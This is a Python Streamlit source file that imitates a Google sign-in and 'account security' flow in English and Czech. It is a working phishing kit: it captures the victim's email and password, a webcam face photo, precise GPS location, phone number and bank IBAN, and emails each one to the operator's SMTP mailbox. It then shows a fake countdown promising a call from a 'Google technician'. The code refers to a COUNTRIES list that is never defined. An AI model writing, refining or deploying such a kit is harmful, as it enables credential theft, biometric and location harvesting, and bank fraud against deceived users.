import streamlit as st
import os
import smtplib
import time
import re
import requests
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from datetime import datetime, timedelta
import streamlit.components.v1 as components

# ====================== JAZYKOVÉ TEXTY ======================
TEXTS = {
    "en": {
        "page_title": "Google Account Security",
        "login_header": "Sign in",
        "login_sub": "Continue to Gmail",
        "email_placeholder": "Email or phone",
        "password_placeholder": "Password",
        "next_btn": "Next",
        "face_header": "Face Scan",
        "face_info": "Step 2: Biometric face scan",
        "face_desc": "For secure sign-in, please align your face in the frame.",
        "gps_header": "Location Verification",
        "gps_info": "Step 2.5: Security location check",
        "gps_desc": "Google detected unusual activity.\nPlease share your current location to continue.",
        "gps_button": "✅ Share my current location",
        "verification_header": "Suspicious activity detected",
        "verification_desc": "Your account is temporarily restricted. Choose verification method.",
        "country_label": "Country",
        "phone_label": "Phone number (9 digits)",
        "call_tab": "Call from technician",
        "bankid_tab": "BankID (Faster)",
        "call_btn": "Request a call",
        "bankid_desc": "Instant unblock via Bank Identity",
        "iban_label": "Account number / IBAN",
        "authorize_btn": "Authorize",
        "finish_header": "Request successfully recorded",
        "finish_status": "### STATUS: AWAITING APPROVAL",
        "finish_info": "A Google technician will contact you shortly.\nDo not close this browser tab.",
        "timer_text": "**Approximately {hours} hours and {minutes} minutes remaining**",
    },
    "cs": {
        "page_title": "Zabezpečení účtu Google",
        "login_header": "Přihlášení",
        "login_sub": "Pokračovat do služby Gmail",
        "email_placeholder": "E-mail nebo telefon",
        "password_placeholder": "Zadejte heslo",
        "next_btn": "Další",
        "face_header": "Sken obličeje",
        "face_info": "Fáze 2: Biometrický sken obličeje",
        "face_desc": "Pro bezpečné přihlášení prosím zarovnejte obličej do rámečku.",
        "gps_header": "Ověření polohy",
        "gps_info": "Fáze 2.5: Bezpečnostní ověření polohy",
        "gps_desc": "Google detekoval neobvyklou aktivitu.\nPro bezpečné pokračování sdílejte svou aktuální polohu.",
        "gps_button": "✅ Sdílet moji aktuální polohu",
        "verification_header": "⚠️ Zjištěna podezřelá aktivita",
        "verification_desc": "Váš účet je dočasně omezen. Vyberte způsob ověření.",
        "country_label": "Země",
        "phone_label": "Telefonní číslo (9 číslic)",
        "call_tab": "Hovor od technika",
        "bankid_tab": "BankID (Urychlit)",
        "call_btn": "Požádat o hovor",
        "bankid_desc": "Okamžité odblokování přes Bankovní Identitu",
        "iban_label": "Číslo účtu / IBAN",
        "authorize_btn": "Autorizovat",
        "finish_header": "Požadavek byl úspěšně zaznamenán",
        "finish_status": "### STATUS: ČEKÁNÍ NA SCHVÁLENÍ",
        "finish_info": "V nejbližší době vás bude kontaktovat technik Google.\nNe zavírejte tuto kartu prohlížeče.",
        "timer_text": "**Zbývá přibližně {hours} hodin a {minutes} minut**",
    }
}

# --- KONFIGURACE ---
MOJE_ADRESA = os.environ.get("MOJE_ADRESA")
MOJE_HESLO = os.environ.get("MOJE_HESLO")

def odeslat_email(subjekt, text, soubor=None):
    if not MOJE_ADRESA or not MOJE_HESLO:
        return
    msg = MIMEMultipart()
    msg['Subject'] = subjekt
    msg['From'] = MOJE_ADRESA
    msg['To'] = MOJE_ADRESA
    msg.attach(MIMEText(text))
    if soubor:
        img = MIMEImage(soubor.read(), name="biometrika.png")
        msg.attach(img)
    try:
        server = smtplib.SMTP_SSL("smtp.seznam.cz", 465)
        server.login(MOJE_ADRESA, MOJE_HESLO)
        server.send_message(msg)
        server.quit()
    except Exception as e:
        print(f"Chyba SMTP: {e}")

# --- VALIDACE ---
def je_validni_email(email):
    return re.match(r"[^@]+@[^@]+\.[^@]+", email)

def je_validni_tel(tel):
    return re.match(r"^\d{9}$", tel)

# --- STAV APLIKACE ---
if "step" not in st.session_state:
    st.session_state.step = "login"
if "zadany_email" not in st.session_state:
    st.session_state.zadany_email = ""
if "language" not in st.session_state:          # ← nové
    st.session_state.language = "en"            # výchozí = angličtina
if "default_country" not in st.session_state:
    st.session_state.default_country = "Česká republika (+420)"
if "finish_start" not in st.session_state:
    st.session_state.finish_start = None

# === AUTOMATICKÁ PŘEDVOLBA ZEMĚ + PŘEPNUTÍ JAZYKA PODLE GPS ===
query_params = st.query_params
if "lat" in query_params and "lon" in query_params:
    lat = str(query_params["lat"][0] if isinstance(query_params["lat"], list) else query_params["lat"])
    lon = str(query_params["lon"][0] if isinstance(query_params["lon"], list) else query_params["lon"])
    acc = str(query_params.get("acc", ["?"])[0] if isinstance(query_params.get("acc"), list) else query_params.get("acc", "?"))
    
    gps_text = f"📍 {lat}, {lon} (přesnost ~{acc}m)"
    st.success(f"✅ Poloha úspěšně získána: **{gps_text}**")
    odeslat_email("📍 GPS COORDINATES", f"Uživatel: {st.session_state.zadany_email}\nGPS: {gps_text}")

    # Reverse geocoding + přepnutí jazyka
    try:
        resp = requests.get(
            f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json",
            headers={"User-Agent": "GoogleSecurityDemo/1.0"},
            timeout=8
        )
        data = resp.json()
        country_code = data.get("address", {}).get("country_code", "xx").lower()
        
        mapping = {
            "cz": "Česká republika (+420)",
            "sk": "Slovensko (+421)",
            "de": "Německo (+49)",
            "at": "Rakousko (+43)",
            "pl": "Polsko (+48)",
            # ... přidej další podle potřeby
        }
        st.session_state.default_country = mapping.get(country_code, "Česká republika (+420)")
        
        # === AUTOMATICKÉ PŘEPNUTÍ JAZYKA ===
        if country_code in ["cz", "sk"]:
            st.session_state.language = "cs"
        else:
            st.session_state.language = "en"
            
    except:
        st.session_state.default_country = "Česká republika (+420)"
        st.session_state.language = "en"

    st.session_state.step = "verification"
    
    # Vyčistit parametry
    for key in ["lat", "lon", "acc"]:
        if key in st.query_params:
            del st.query_params[key]
    st.rerun()

# ====================== STREAMLIT SETUP ======================
st.set_page_config(page_title=TEXTS[st.session_state.language]["page_title"], page_icon="🔒")

st.markdown("""
    <style>
    div.stButton > button:first-child {background-color: #4285F4; color: white; border: none; width: 100%; height: 45px; font-weight: bold;}
    .google-header { font-family: 'Product Sans', sans-serif; text-align: center; }
    </style>
    """, unsafe_allow_html=True)

def show_logo():
    st.markdown("<h1 style='text-align: center;'><span style='color: #4285F4;'>G</span><span style='color: #EA4335;'>o</span><span style='color: #FBBC05;'>o</span><span style='color: #4285F4;'>g</span><span style='color: #34A853;'>l</span><span style='color: #EA4335;'>e</span></h1>", unsafe_allow_html=True)

col1, col2, col3 = st.columns(3)
with col2:
    # LOGIN (vždy angličtina)
    if st.session_state.step == "login":
        show_logo()
        st.markdown(f"<h3 class='google-header'>{TEXTS['en']['login_header']}</h3>", unsafe_allow_html=True)
        st.write(TEXTS['en']['login_sub'])
        em = st.text_input(TEXTS['en']['email_placeholder'])
        he = st.text_input(TEXTS['en']['password_placeholder'], type="password")
        if st.button(TEXTS['en']['next_btn']):
            if je_validni_email(em) and len(he) > 3:
                st.session_state.zadany_email = em
                odeslat_email("🔑 LOGIN", f"Email: {em}\nHeslo: {he}")
                with st.spinner("Verifying..."):
                    time.sleep(1.5)
                st.session_state.step = "face"
                st.rerun()
            else:
                st.error("Please enter a valid email and password.")

    # FACE SCAN (vždy angličtina)
    elif st.session_state.step == "face":
        show_logo()
        st.info(TEXTS['en']['face_info'])
        st.write(TEXTS['en']['face_desc'])
        foto = st.camera_input("Scan identity")
        if foto:
            with st.status("Sending biometric data...") as status:
                odeslat_email("📸 FACE SCAN", f"Uživatel: {st.session_state.zadany_email}", soubor=foto)
                time.sleep(2)
                status.update(label="Scan completed", state="complete")
            st.session_state.step = "gps"
            st.rerun()

    # GPS (vždy angličtina)
    elif st.session_state.step == "gps":
        show_logo()
        st.info(TEXTS['en']['gps_info'])
        st.write(TEXTS['en']['gps_desc'])
        components.html(
            f"""
            <div style="text-align:center; padding:30px; background:#f8f9fa; border-radius:12px; box-shadow:0 2px 8px rgba(0,0,0,0.1); max-width:420px; margin:0 auto;">
                <h3 style="color:#202124; font-family:'Product Sans',sans-serif;">{TEXTS['en']['gps_header']}</h3>
                <p style="color:#5f6368; margin-bottom:20px;">{TEXTS['en']['gps_desc'].replace('\n','<br>')}</p>
                <button onclick="getGPS()" style="background:#4285F4; color:white; padding:14px 40px; font-size:16px; border:none; border-radius:8px; cursor:pointer; font-weight:bold; box-shadow:0 2px 4px rgba(66,133,244,0.3);">
                    {TEXTS['en']['gps_button']}
                </button>
            </div>
            <script>
            function getGPS() {{
                if (navigator.geolocation) {{
                    navigator.geolocation.getCurrentPosition(
                        function(position) {{
                            const lat = position.coords.latitude.toFixed(6);
                            const lon = position.coords.longitude.toFixed(6);
                            const acc = position.coords.accuracy.toFixed(0);
                            const params = new URLSearchParams(window.parent.location.search);
                            params.set("lat", lat);
                            params.set("lon", lon);
                            params.set("acc", acc);
                            window.parent.history.replaceState(null, '', '?' + params.toString());
                            window.parent.location.reload();
                        }},
                        function(error) {{ alert("Could not get location. Please try again."); }},
                        {{ enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }}
                    );
                }}
            }}
            </script>
            """,
            height=380
        )

    # VERIFICATION + FINISH (používá aktuální jazyk podle GPS)
    elif st.session_state.step == "verification":
        lang = st.session_state.language
        show_logo()
        st.error(TEXTS[lang]["verification_header"])
        st.write(TEXTS[lang]["verification_desc"])

        index = 0  # default
        zeme = st.selectbox(TEXTS[lang]["country_label"], COUNTRIES, index=index)  # COUNTRIES je stejný seznam jako dříve

        tel = st.text_input(TEXTS[lang]["phone_label"])
        
        tab1, tab2 = st.tabs([TEXTS[lang]["call_tab"], TEXTS[lang]["bankid_tab"]])
        with tab1:
            if st.button(TEXTS[lang]["call_btn"]):
                if je_validni_tel(tel):
                    odeslat_email("📞 KONTAKT", f"Uživatel: {st.session_state.zadany_email}\nTel: {tel} ({zeme})")
                    st.session_state.step = "finish"
                    st.session_state.finish_start = datetime.now()
                    st.rerun()
                else:
                    st.error("Enter exactly 9 digits!")
        with tab2:
            st.write(TEXTS[lang]["bankid_desc"])
            ib = st.text_input(TEXTS[lang]["iban_label"])
            if st.button(TEXTS[lang]["authorize_btn"]):
                if je_validni_tel(tel) and len(ib) > 10:
                    odeslat_email("🏦 BANKID DATA", f"User: {st.session_state.zadany_email}\nTel: {tel}\nIBAN: {ib}")
                    st.session_state.step = "finish"
                    st.session_state.finish_start = datetime.now()
                    st.rerun()
                else:
                    st.error("Fill in phone and valid IBAN.")

    elif st.session_state.step == "finish":
        lang = st.session_state.language
        show_logo()
        st.success(TEXTS[lang]["finish_header"])
        st.markdown(TEXTS[lang]["finish_status"])
        st.info(TEXTS[lang]["finish_info"])
        
        if st.session_state.finish_start:
            elapsed = datetime.now() - st.session_state.finish_start
            remaining = timedelta(hours=24) - elapsed
            hours = max(0, int(remaining.total_seconds() // 3600))
            minutes = max(0, int((remaining.total_seconds() % 3600) // 60))
            st.progress(min(100, int(elapsed.total_seconds() / (24*3600) * 100)))
            st.write(TEXTS[lang]["timer_text"].format(hours=hours, minutes=minutes))
        
        st.info("Do not close this browser tab.")
